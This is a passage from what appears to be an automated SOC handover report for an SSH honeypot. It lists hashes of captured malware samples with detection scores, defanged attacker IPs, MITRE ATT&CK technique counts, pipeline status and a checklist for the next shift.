| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `192.200.205[.]244` | US | SKYQUANTUM TELECOM LTD. | **100** ⚠️ | 9 |
| `103.250.160[.]76` | IN | Gtpl Broadband Pvt. Ltd. | **100** ⚠️ | 41 |
| `103.112.224[.]81` | IN | Flynet Broadband Pvt Ltd | **100** ⚠️ | 9 |
| `112.26.99[.]93` | CN | China Mobile Communications Corporation | **100** ⚠️ | 24 |
| `111.70.21[.]178` | TW | Chunghwa Telecom Co.,Ltd. | **100** ⚠️ | 50 |
| `179.185.1[.]97` | BR | TELEFÔNICA BRASIL S.A | **100** ⚠️ | 17 |
| `43.164.195[.]69` | BR | ACEVILLE PTE.LTD. | **100** ⚠️ | 8 |
| `65.20.175[.]6` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 38 |
| `43.163.231[.]187` | JP | ACEVILLE PTE.LTD. | **100** ⚠️ | 10 |
| `95.79.57[.]221` | RU | JSC ER-Telecom Holding Nizhny Novgorod branch | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 38 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 23 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 8 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 4 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 4 |

---

## 🔕 False Positive Summary (6 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 5 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 46 cases |
| Tool 34  | Credential Extractor        | ✅ 31 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 34 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 6 filtered (13.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 26 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 21 files |
| Tool 33  | YARA Classifier             | ✅ 7 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 8 priority case(s) shown individually · 28 recon entry/entries in table (4 group(s) consolidating 8 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-02T10:50:52Z_
